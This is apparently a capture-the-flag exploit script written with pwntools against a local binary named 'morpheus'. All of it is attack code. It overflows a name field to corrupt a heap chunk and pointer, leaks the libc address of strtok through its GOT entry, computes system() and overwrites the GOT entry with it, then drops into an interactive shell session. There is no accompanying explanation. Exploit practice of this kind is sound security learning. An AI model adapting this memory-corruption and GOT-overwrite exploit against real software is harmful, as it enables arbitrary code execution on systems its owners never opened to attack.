from pwn import *
r = process("./morpheus")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def un64(data):
    return int(data[::-1].encode("hex"),16)

def main():
    offset = 40
    chunk = 0x0000000000000021
    strtok = 0x000000602078

    p = "A" * offset
    p += p64(chunk)
    p += p64(strtok)
    p += p64(0x00)

    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","2")
    r.sendlineafter("Insert Name: ",p)


    #--------
    # leak the libc strtok function
    r.recvuntil("| ID   : 3")
    r.recvuntil("| Name : ")
    leak = un64(r.recv(8).replace("|" ,"").replace("\n",""))

    log.info("leak strtok GOT : " + hex(leak))

    #-------
    # kalkulasi
    libc_base = leak - libc.symbols['strtok']
    libc_system = libc_base + libc.symbols['system']


    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","3")
    r.sendlineafter("Insert Name: ",p64(libc_system))




    r.interactive()

if __name__ == '__main__':
    main()
